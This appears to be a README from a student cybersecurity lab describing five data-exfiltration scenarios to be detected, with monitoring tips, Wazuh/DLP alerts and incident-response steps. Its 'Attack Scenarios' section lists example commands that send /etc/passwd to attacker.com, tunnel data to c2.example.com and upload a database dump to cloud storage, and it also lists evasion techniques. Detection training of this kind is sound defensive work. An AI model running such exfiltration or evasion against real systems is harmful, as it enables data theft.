# Data Exfiltration Scenarios (21-25)

## Overview

Data exfiltration scenarios test detection of unauthorized data transfer, covert channels, and information theft.

## Scenarios in This Category

### Scenario 21: FTP Data Exfiltration (Template)
- **File:** `21_ftp_exfiltration.py`
- **Type:** Data Exfiltration
- **Target:** External FTP server
- **Detection:** DLP, Network monitoring, Wazuh
- **Difficulty:** Intermediate
- **Implementation:** Use template in [REMAINING_SCENARIOS.md](../../infra/scripts/pro-scenarios/REMAINING_SCENARIOS.md)

### Scenario 22: SSH Tunnel Exfiltration (Template)
- **File:** `22_ssh_tunnel_exfil.py`
- **Type:** Covert Channel / Encrypted Exfiltration
- **Target:** SSH tunnel to external host
- **Detection:** Behavioral analysis, Network anomaly
- **Difficulty:** Advanced
- **Implementation:** Use template in [REMAINING_SCENARIOS.md](../../infra/scripts/pro-scenarios/REMAINING_SCENARIOS.md)

### Scenario 23: Cloud Storage Exfiltration (Template)
- **File:** `23_cloud_exfiltration.py`
- **Type:** Cloud Service Abuse / Shadow IT
- **Target:** Cloud provider (Dropbox, OneDrive, etc.)
- **Detection:** DLP, Cloud monitoring
- **Difficulty:** Advanced
- **Implementation:** Use template in [REMAINING_SCENARIOS.md](../../infra/scripts/pro-scenarios/REMAINING_SCENARIOS.md)

### Scenario 24: Email Data Exfiltration (Template)
- **File:** `24_email_exfiltration.py`
- **Type:** Email-based data loss
- **Target:** External email account
- **Detection:** Email gateway, DLP
- **Difficulty:** Intermediate
- **Implementation:** Use template in [REMAINING_SCENARIOS.md](../../infra/scripts/pro-scenarios/REMAINING_SCENARIOS.md)

### Scenario 25: Database Dump Exfiltration (Template)
- **File:** `25_database_exfiltration.py`
- **Type:** Database breach / Mass data theft
- **Target:** Database server
- **Detection:** Database audit logs, DLP, Network monitoring
- **Difficulty:** Advanced
- **Implementation:** Use template in [REMAINING_SCENARIOS.md](../../infra/scripts/pro-scenarios/REMAINING_SCENARIOS.md)

## Implementation Status

| Scenario | Status | Details |
|----------|--------|---------|
| 21-25 | 📋 Template | Implement using REMAINING_SCENARIOS.md |

## Quick Start

```bash
# View template examples
cd /Users/ziaparvaresh/Library/CloudStorage/OneDrive-TAFENSW/CyberSecurity-Diploma/Project
cat infra/scripts/pro-scenarios/REMAINING_SCENARIOS.md

# Copy template for your scenario
cp infra/scripts/pro-scenarios/utils/scenario_template.py 5_data_exfiltration/21_ftp_exfiltration.py

# Implement the logic
nano 5_data_exfiltration/21_ftp_exfiltration.py

# Test it
python 5_data_exfiltration/21_ftp_exfiltration.py --target exfil.cyberlab.local --file /tmp/test.txt
```

## Monitoring Tips

1. **For FTP Exfiltration (21):**
   - Monitor FTP command sequences (USER, PASS, STOR)
   - Check file transfer size and frequency
   - Review Wazuh data transfer anomaly alerts
   - Monitor network traffic to FTP ports (21, 990)
   - Check DLP rules for file type detection

2. **For SSH Tunneling (22):**
   - Monitor SSH connection duration and data volume
   - Check for unusual SSH client behavior
   - Review SSH connection frequency patterns
   - Monitor outbound SSH to non-standard ports
   - Baseline SSH traffic for anomaly detection

3. **For Cloud Storage (23):**
   - Monitor HTTP/HTTPS requests to cloud providers
   - Check for unusual authentication to cloud services
   - Review file upload patterns to cloud
   - Detect shadow IT cloud usage
   - Monitor cloud API activity and frequency

4. **For Email Exfiltration (24):**
   - Monitor email recipient patterns
   - Check email attachment types and sizes
   - Review email frequency from users
   - Monitor domain reputation scores
   - Check for external recipient emails

5. **For Database Exfiltration (25):**
   - Monitor database query patterns
   - Check for large SELECT queries (>1GB)
   - Review database backup/dump commands
   - Monitor database user activity
   - Check network bytes transferred from DB server

## Expected Alerts

| Scenario | Alert Type | Tool | Expected Message |
|----------|-----------|------|------------------|
| 21 | Data Transfer | Wazuh/DLP | "Suspicious FTP activity detected" |
| 22 | Network Anomaly | Wazuh | "SSH tunnel with high data transfer" |
| 23 | Cloud Upload | DLP | "Data upload to cloud storage" |
| 24 | Email Alert | Gateway | "Suspicious email with attachment" |
| 25 | DB Anomaly | Wazuh | "Large database query detected" |

## Data Loss Prevention (DLP) Setup

### Enabling DLP Detection

```
Wazuh > Modules > Data Loss Prevention
Configure:
- File patterns to monitor
- Keyword patterns (SSN, credit card, etc.)
- External communication rules
- Cloud upload restrictions
```

## Network Baseline Establishment

Before running exfiltration scenarios, establish a baseline:

```bash
# Capture baseline metrics
python infra/scripts/pro-scenarios/utils/scenario_manager.py --baseline

# This will record:
- Normal data transfer rates
- Typical protocol usage
- Regular external connections
- Standard user behavior

# Use for anomaly detection
```

## Regulatory Compliance

These scenarios help validate compliance with:

| Regulation | Requirements | Scenario |
|-----------|--------------|----------|
| **GDPR** | Data protection | 21-25 |
| **HIPAA** | Protected health information | 21-25 |
| **PCI DSS** | Cardholder data | 21, 25 |
| **SOC 2** | Data confidentiality | 21-25 |
| **ISO 27001** | Information security | 21-25 |

## Attack Scenarios

### Insider Threat Scenario
```bash
# User with legitimate access downloads database and uploads to cloud
python 25_database_exfiltration.py --target postgres.cyberlab.local
python 23_cloud_exfiltration.py --target dropbox.com --file /tmp/dump.sql
```

### Ransomware With Exfiltration
```bash
# Attacker steals data before encryption
python 21_ftp_exfiltration.py --target attacker.com --file /etc/passwd
```

### APT Data Theft
```bash
# Stealthy, encrypted exfiltration
python 22_ssh_tunnel_exfil.py --target c2.example.com --data sensitive
```

## Detection Evasion Techniques

These scenarios simulate:

- **Encryption** - SSH, HTTPS tunneling
- **Obfuscation** - Chunking, encoding data
- **Timing** - Slow exfiltration over time
- **Volume** - Splitting across multiple transfers
- **Method** - Using legitimate services (email, cloud)

## Response Playbooks

When exfiltration is detected:

1. **Immediate** (0-5 min)
   - Isolate affected system
   - Disable user credentials
   - Block external connections

2. **Short-term** (5-30 min)
   - Determine scope of exfiltration
   - Identify data types stolen
   - Preserve logs and evidence

3. **Medium-term** (30 min - 24 hours)
   - Notify stakeholders
   - Begin forensic investigation
   - Review other systems for compromise

4. **Long-term** (24 hours+)
   - Conduct full investigation
   - Remediate root cause
   - Implement preventive controls
   - Update detection rules

## Documentation

- Full details: See [PRO_SCENARIOS.md](../../PRO_SCENARIOS.md)
- Monitoring guide: See [MONITORING_GUIDE.md](../../MONITORING_GUIDE.md)
- Implementation guide: See [REMAINING_SCENARIOS.md](../../REMAINING_SCENARIOS.md)
- DLP setup: See [CYBERLAB_COMPLETE_GUIDE.md](../../CYBERLAB_COMPLETE_GUIDE.md)
- All scenarios: See [README.md](../README.md)

## Legal & Compliance Notes

- ⚠️ Only run these scenarios in authorized test environments
- ⚠️ Obtain proper authorization before testing
- ⚠️ Document all activities for compliance review
- ⚠️ Follow organizational security policies
- ⚠️ Comply with data protection regulations
